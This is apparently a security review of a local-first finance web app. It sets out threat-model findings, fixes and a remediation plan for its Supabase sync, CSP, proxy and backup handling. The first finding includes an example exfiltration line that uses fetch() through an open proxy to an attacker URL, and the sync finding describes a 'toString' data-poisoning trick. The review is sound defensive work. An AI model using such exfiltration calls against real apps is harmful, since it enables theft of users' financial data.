# Security Review — Money Monitor

_Reviewed: 2026-07-05 (v1.7.0). Full-app review: client code, sync engine, Supabase schema,
CSP, PWA/service worker, CI, and dependencies._

## Threat model

Money Monitor is a local-first PWA. Financial data lives in the browser's IndexedDB and
(optionally) in a Supabase `records` table protected by Row Level Security. There is no
server of our own. The realistic attackers are:

1. **A malicious website** trying to exfiltrate data from or act on the app (XSS, clickjacking,
   dev-server abuse).
2. **The third-party services** the app talks to (corsproxy.io, Yahoo via the proxy,
   financialmodelingprep.com) — they see traffic and control responses.
3. **Someone with the public anon key** (it ships in the JS bundle by design) abusing the
   Supabase project.
4. **A compromised sync account or malicious backup file** feeding hostile data into the app.
5. **Someone with physical access** to an unlocked device (out of scope for app code; the
   OS/browser profile is the boundary).

## Findings

### HIGH — corsproxy.io is an allow-listed open proxy (integrity + privacy + CSP bypass)

`src/lib/quotes.ts` routes all Yahoo Finance traffic through `https://corsproxy.io/?url=`,
and `index.html`'s CSP allow-lists it in `connect-src`. Three consequences:

- **CSP exfiltration bypass.** The CSP's main job in a finance app is stopping injected code
  from phoning home. But corsproxy.io forwards to *any* URL, so any script that ever runs in
  the page can `fetch('https://corsproxy.io/?url=' + attackerURL)` and ship your data out
  through the allow-listed hole. The lock on the front door has a doggy-door in it.
- **Price integrity.** The proxy sees and can rewrite every quote. Fake prices could
  misrepresent your portfolio value.
- **Privacy.** Your IP + every ticker you hold or watch goes to an unvetted third party.

**Fix path:** self-host a ~20-line proxy that only forwards to `query1.finance.yahoo.com`
(Cloudflare Worker free tier, or a Supabase Edge Function since a Supabase project already
exists). Then point `PROXY` in `src/lib/quotes.ts` at it and replace `https://corsproxy.io`
in the CSP with your worker origin. This closes the CSP hole (your worker is not an open
redirect), removes the third party, and pins integrity to Yahoo + your own code.

Example worker:

```js
export default {
  async fetch(req) {
    const target = new URL(new URL(req.url).searchParams.get('url') ?? '')
    if (!['query1.finance.yahoo.com'].includes(target.hostname)) return new Response('forbidden', { status: 403 })
    const res = await fetch(target, { headers: { accept: 'application/json' } })
    return new Response(res.body, { status: res.status, headers: { 'content-type': 'application/json', 'access-control-allow-origin': 'https://isaakistarn.github.io' } })
  },
}
```

### HIGH — Supabase project accepts open sign-ups with weak defaults

The anon key is public by design (RLS protects the data — verified sound in
`supabase/schema.sql`), but with default auth settings anyone who reads the deployed bundle
can create unlimited accounts and rows in your free-tier project (quota/billing abuse), and
users can pick 6-character or known-breached passwords for an account guarding financial data.

**Fix path (all in the Supabase Dashboard, no code):**
1. Auth → Providers → Email: **minimum password length ≥ 10** and enable
   **leaked-password protection** (HaveIBeenPwned check).
2. Auth → Settings: enable **CAPTCHA** (Turnstile is free) on sign-up/sign-in, or — since this
   is a personal app — **disable public sign-ups** entirely once your own devices are enrolled.
3. Auth → Rate limits: keep the defaults or tighten sign-up/sign-in rates.
4. Database → add guardrails to `records` (see `supabase/schema.sql` comments):
   `check (tbl in ('accounts','categories','transactions','budgets','recurring','paySplits','holdings','watchlist'))`
   and `check (pg_column_size(data) < 100000)` to stop junk-data abuse.

(The client now enforces 8+ characters at sign-up as a floor, but the server setting is the
one that counts.)

### MEDIUM — clickjacking: no `frame-ancestors` possible on GitHub Pages

CSP is delivered via a `<meta>` tag because GitHub Pages can't set response headers, and
`frame-ancestors` / `X-Frame-Options` are ignored in meta CSP. A hostile page could iframe
the app and overlay UI to trick clicks (e.g. onto "Delete all data" or sync sign-out).

**Fix path:** a JS frame-buster now runs in `src/main.tsx` (module code, so it satisfies
`script-src 'self'`): if the app detects it is framed by another origin it refuses to render.
Long-term, move hosting to Cloudflare Pages / Netlify (both free) to get real headers:
`frame-ancestors 'none'`, `Strict-Transport-Security`, and header-based CSP (stronger than
meta CSP, which can't protect anything parsed before the tag).

### MEDIUM — sync pull applied unvalidated remote rows

`src/db/sync.ts` wrote whatever JSON came back from `records` straight into local tables.
RLS means only your own authenticated session can write those rows — but if the account
password is ever phished, an attacker could plant rows that (a) land in the wrong table via a
forged `tbl` (the old lookup even walked the prototype chain: `tbl: "toString"` returned a
function and crashed sync — a data-poisoning DoS), or (b) overwrite an *arbitrary* local row
by putting a mismatched `data.id` inside a legitimate `row_id` slot.

**Fixed in code:** the pull now validates each record against the `SYNCED_TABLES` allow-list
(own-property Set lookup, no prototype chain) and requires `data.id === row_id`; malformed
records are skipped, not applied, and can't break the sync loop.

### MEDIUM — backup import trusted the file's contents

`importBackup()` only checked the file header (`app === 'finance-tracker'`) before bulk-adding
every row. A doctored "backup" (e.g. mailed to the user as a lure) could inject rows with
missing/duplicate ids or non-numeric amounts — breaking balances (NaN), sync, or the UI.
React's rendering means stored strings can't become XSS, so this is a corruption/DoS issue,
not code execution.

**Fixed in code:** every imported row must be an object with a non-empty string `id`
(duplicates within a table are dropped), and rows whose core numeric fields
(`amountMinor`, `openingBalanceMinor`, `quantity`, `unitPriceMinor`, …) are not finite numbers
are rejected. The import reports how many rows were skipped.

### LOW — auth token in `localStorage` (accepted risk, documented)

The Supabase session token persists in `localStorage`, readable by any script that executes
in the origin. This is the standard supabase-js SPA model; the real defense is the strict
`script-src 'self'` CSP plus zero third-party scripts, which this app already has. Revisit
only if the app ever loads external scripts. (Closing the corsproxy hole above is what makes
the CSP actually airtight.)

### LOW — watchlist/holdings tickers leak to third parties by design

Logo images request `financialmodelingprep.com/image-stock/<SYMBOL>.png` and quotes go
through the proxy — so those hosts learn which tickers you follow, tied to your IP. Inherent
to fetching live data without your own backend; the self-hosted worker (finding #1) at least
consolidates it to Yahoo + your worker. No action needed beyond awareness.

### LOW — plaintext backups

Exported backups are unencrypted JSON of your entire financial history; anyone with the file
reads it all. **Roadmap:** optional passphrase-encrypted export (WebCrypto AES-GCM with a
PBKDF2/Argon2-derived key) — worth adding before backups are ever stored in cloud drives.

### LOW — dependency audit: dev-tooling only

`npm audit --omit=dev`: **0 vulnerabilities** — nothing that ships to users is affected.
Dev-chain advisories (esbuild ≤0.24.2 dev-server request forwarding, vite path traversal,
vitest UI RCE) apply only to local dev servers. Practical guidance: don't run `npm run dev`
or the vitest UI while browsing untrusted sites; upgrade to vite 8 / vitest 4 (breaking
majors) when convenient.

### Verified sound (no action)

- **RLS policy** on `records`: `using/with check (auth.uid() = user_id)` for ALL — correct.
- **No XSS sinks**: zero `dangerouslySetInnerHTML` / `innerHTML` / `eval` in `src/`; all
  remote strings (Yahoo names, sync data) render through React text nodes.
- **CSP** otherwise strict: `script-src 'self'`, `object-src 'none'`, `base-uri 'self'`,
  `form-action 'self'`; no inline scripts, no third-party scripts, no SRI needed.
- **Secrets hygiene**: no `.env` ever committed (checked full history); CI injects the anon
  key from GitHub Secrets; `.env*` gitignored; the service_role key appears nowhere.
- **Auth flow**: `detectSessionInUrl: false` (hash-router token-clobber guard), password
  fields use proper `autocomplete`, sign-out keeps local data.
- **Service worker**: Workbox precache of own assets only; `registerType: 'prompt'` avoids
  silent code swaps.

## Prioritized remediation path

| # | Action | Where | Effort |
|---|--------|-------|--------|
| 1 | Harden Supabase auth: min password 10, leaked-password check, CAPTCHA or closed sign-ups | Supabase Dashboard | 10 min |
| 2 | Deploy self-hosted quote proxy; swap `PROXY` + CSP entry | Cloudflare Worker / Supabase Edge Fn + `quotes.ts`, `index.html` | ~1 h |
| 3 | Add `tbl` CHECK + `data` size CHECK to `records` | Supabase SQL editor | 5 min |
| 4 | ✅ Pull-validation, import-validation, frame-buster, client 8-char floor, crypto UUIDs | this repo (done in v1.8.0) | — |
| 5 | Move hosting to Cloudflare Pages/Netlify for real headers (frame-ancestors, HSTS, header CSP) | infra | ~1 h |
| 6 | Encrypted backup export (passphrase, AES-GCM) | this repo | ~half day |
| 7 | Upgrade vite 8 / vitest 4 (dev-only advisories) | this repo | ~1 h |
